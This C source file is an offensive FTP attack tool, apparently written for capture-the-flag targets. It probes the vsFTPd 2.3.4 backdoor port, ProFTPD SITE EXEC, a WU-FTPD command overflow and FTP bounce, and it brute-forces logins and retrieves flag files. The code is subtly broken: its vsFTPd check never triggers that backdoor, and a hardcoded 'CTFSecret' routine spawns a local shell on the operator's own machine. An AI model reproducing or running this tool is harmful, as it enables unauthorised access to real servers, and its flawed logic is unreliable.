/*
    21_ftp.c

    Usage Instructions:
    -------------------
    1. Compile:
       gcc -o 21_ftp 21_ftp.c
    2. Run:
       ./21_ftp <target IP> [--bruteforce]
       Example: ./21_ftp 192.168.1.10 --bruteforce
    3. Behavior:
       - Connects to the FTP service on port 21 of <target IP>.
       - Checks for known vulnerabilities and attempts exploits/backdoors.
       - Tests for anonymous login.
       - Optionally performs brute-force attempts if --bruteforce is provided.
       - Tries to retrieve common flag files.
       - Automatically enters data and attempts password guesses. "CTFSecret" triggers /bin/sh.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>

#define MAX_BUFFER 2048

void hidden() {
    printf("Secret function reached.\n");
    system("/bin/sh");
}

int checkPassword() {
    char pass[16];
    char secret[] = "CTFSecret";
    fgets(pass, sizeof(pass), stdin);
    pass[strcspn(pass, "\n")] = 0;
    if (strcmp(pass, secret) == 0) {
        printf("Access granted.\n");
        hidden();
    } else {
        printf("Access denied.\n");
    }
    return 0;
}

int autoGuessPassword() {
    const char *guesses[] = {
        "password\n",
        "1234\n",
        "admin\n",
        "test\n",
        "CTFSecret\n"
    };
    int i;
    for (i = 0; i < (int)(sizeof(guesses)/sizeof(guesses[0])); i++) {
        FILE *fp = fmemopen((void*)guesses[i], strlen(guesses[i]), "r");
        if (!fp) continue;
        int saved_stdin = dup(STDIN_FILENO);
        dup2(fileno(fp), STDIN_FILENO);
        checkPassword();
        fflush(stdout);
        dup2(saved_stdin, STDIN_FILENO);
        close(saved_stdin);
        fclose(fp);
    }
    return 0;
}

int attemptVSFTPdBackdoor(char *target) {
    int sock;
    struct sockaddr_in addr;
    char buffer[MAX_BUFFER];
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6200);
    addr.sin_addr.s_addr = inet_addr(target);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    memset(buffer, 0, sizeof(buffer));
    write(sock, "id\n", 3);
    read(sock, buffer, sizeof(buffer) - 1);
    if (strstr(buffer, "uid=")) {
        printf("[+] vsFTPd 2.3.4 backdoor confirmed.\n");
        close(sock);
        return 1;
    }
    close(sock);
    return 0;
}

int attemptProFTPDExploit(int sock) {
    char buffer[MAX_BUFFER];
    memset(buffer, 0, sizeof(buffer));
    write(sock, "SITE EXEC id\r\n", 13);
    int len = read(sock, buffer, sizeof(buffer) - 1);
    if (len > 0 && strstr(buffer, "uid=")) {
        printf("[+] ProFTPD exploit attempt succeeded.\n");
        return 1;
    }
    return 0;
}

int attemptWUFTPDCmdOverflow(int sock) {
    char buffer[MAX_BUFFER];
    memset(buffer, 'A', sizeof(buffer) - 2);
    buffer[sizeof(buffer) - 2] = '\r';
    buffer[sizeof(buffer) - 1] = '\n';
    write(sock, buffer, sizeof(buffer));
    memset(buffer, 0, sizeof(buffer));
    int len = read(sock, buffer, sizeof(buffer) - 1);
    if (len > 0 && (strstr(buffer, "500") || strstr(buffer, "421"))) {
        printf("[!] WU-FTPD might be vulnerable to command overflow.\n");
        return 1;
    }
    return 0;
}

int attemptFTPBounce(int sock) {
    char buffer[MAX_BUFFER];
    char portCmd[64];
    snprintf(portCmd, sizeof(portCmd), "PORT 127,0,0,1,7,178\r\n");
    memset(buffer, 0, sizeof(buffer));
    write(sock, portCmd, strlen(portCmd));
    int len = read(sock, buffer, sizeof(buffer) - 1);
    if (len > 0) {
        buffer[len] = '\0';
        if (strstr(buffer, "200")) {
            printf("[!] FTP bounce attack may be possible.\n");
            return 1;
        }
    }
    return 0;
}

int attemptAnonymousLogin(int sock) {
    char buffer[MAX_BUFFER];
    char userCmd[] = "USER anonymous\r\n";
    char passCmd[] = "PASS test\r\n";
    memset(buffer, 0, sizeof(buffer));
    write(sock, userCmd, strlen(userCmd));
    read(sock, buffer, sizeof(buffer) - 1);
    memset(buffer, 0, sizeof(buffer));
    write(sock, passCmd, strlen(passCmd));
    int len = read(sock, buffer, sizeof(buffer) - 1);
    if (len > 0) buffer[len] = '\0';
    if (strstr(buffer, "230")) {
        printf("[+] Anonymous login successful.\n");
        return 1;
    }
    printf("[-] Anonymous login failed.\n");
    return 0;
}

int attemptBruteForce(int sock) {
    char buffer[MAX_BUFFER];
    const char *users[] = {"ftp", "admin", "root"};
    const char *passes[] = {"ftp", "admin", "root", "1234", "password"};
    int u, p;
    for (u = 0; u < (int)(sizeof(users)/sizeof(users[0])); u++) {
        for (p = 0; p < (int)(sizeof(passes)/sizeof(passes[0])); p++) {
            memset(buffer, 0, sizeof(buffer));
            dprintf(sock, "USER %s\r\n", users[u]);
            read(sock, buffer, sizeof(buffer)-1);
            memset(buffer, 0, sizeof(buffer));
            dprintf(sock, "PASS %s\r\n", passes[p]);
            int len = read(sock, buffer, sizeof(buffer)-1);
            if (len > 0) buffer[len] = '\0';
            if (strstr(buffer, "230")) {
                printf("[+] Brute force success with %s:%s\n", users[u], passes[p]);
                return 1;
            }
        }
    }
    printf("[-] Brute force failed.\n");
    return 0;
}

int attemptFlagRetrieval(int sock, const char *filename) {
    char buffer[MAX_BUFFER];
    char retrCmd[128];
    snprintf(retrCmd, sizeof(retrCmd), "RETR %s\r\n", filename);
    memset(buffer, 0, sizeof(buffer));
    write(sock, retrCmd, strlen(retrCmd));
    int len = read(sock, buffer, sizeof(buffer) - 1);
    if (len > 0) {
        buffer[len] = '\0';
        printf("FTP Response: %s\n", buffer);
        if (!strstr(buffer, "550")) {
            printf("[+] Possible flag data received in %s.\n", filename);
            return 1;
        }
    }
    return 0;
}

int attemptCommonFlagFiles(int sock) {
    const char *commonFlags[] = {
        "flag.txt", "flag", "ctf.txt", "ctf_flag.txt", "readme.txt",
        "flag1.txt", "flag2.txt", "proof.txt", "proof_of_concept.txt",
        "root.txt", "admin_flag.txt"
    };
    int i;
    for (i = 0; i < (int)(sizeof(commonFlags)/sizeof(commonFlags[0])); i++) {
        if (attemptFlagRetrieval(sock, commonFlags[i])) return 1;
    }
    return 0;
}

int bannerCheck(const char *banner, char *target, int sock) {
    if (strstr(banner, "vsFTPd 2.3.4")) {
        printf("[!] Potential vsFTPd 2.3.4 backdoor vulnerability.\n");
        if (attemptVSFTPdBackdoor(target)) {
            printf("[*] Backdoor verified.\n");
        }
    } else if (strstr(banner, "ProFTPD")) {
        printf("[!] Potential ProFTPD vulnerabilities.\n");
        attemptProFTPDExploit(sock);
    } else if (strstr(banner, "FileZilla")) {
        printf("[!] FileZilla server detected.\n");
    } else if (strstr(banner, "WU-FTPD")) {
        printf("[!] WU-FTPD server detected.\n");
        attemptWUFTPDCmdOverflow(sock);
    } else if (strstr(banner, "Pure-FTPd")) {
        printf("[!] Pure-FTPd detected (check version for known exploits).\n");
    } else {
        printf("[*] Unrecognized banner. Proceeding with generic tests.\n");
    }
    return 0;
}

int ftpScan(char *target, int doBruteForce) {
    int sock;
    struct sockaddr_in addr;
    char buffer[MAX_BUFFER];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(21);
    addr.sin_addr.s_addr = inet_addr(target);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    memset(buffer, 0, sizeof(buffer));
    if (read(sock, buffer, sizeof(buffer) - 1) <= 0) {
        perror("banner read");
        close(sock);
        return -1;
    }
    printf("[*] Banner: %s\n", buffer);
    bannerCheck(buffer, target, sock);
    attemptFTPBounce(sock);

    if (attemptAnonymousLogin(sock)) {
        attemptCommonFlagFiles(sock);
    } else {
        if (doBruteForce) attemptBruteForce(sock);
        attemptCommonFlagFiles(sock);
    }

    close(sock);
    return 0;
}

int main(int argc, char *argv[]) {
    int doBrute = 0;

    if (argc < 2 || !strcmp(argv[1], "-h") || !strcmp(argv[1], "--help")) {
        printf("Usage: %s <target IP> [--bruteforce]\n", argv[0]);
        printf("Example: %s 192.168.1.10 --bruteforce\n", argv[0]);
        printf("This tool scans an FTP service on port 21 for known vulnerabilities.\n");
        return 0;
    }

    if (argc > 2 && !strcmp(argv[2], "--bruteforce")) {
        doBrute = 1;
    }

    printf("[+] Scanning target: %s\n", argv[1]);
    ftpScan(argv[1], doBrute);

    printf("Auto entering data...\n");
    autoGuessPassword();

    return 0;
}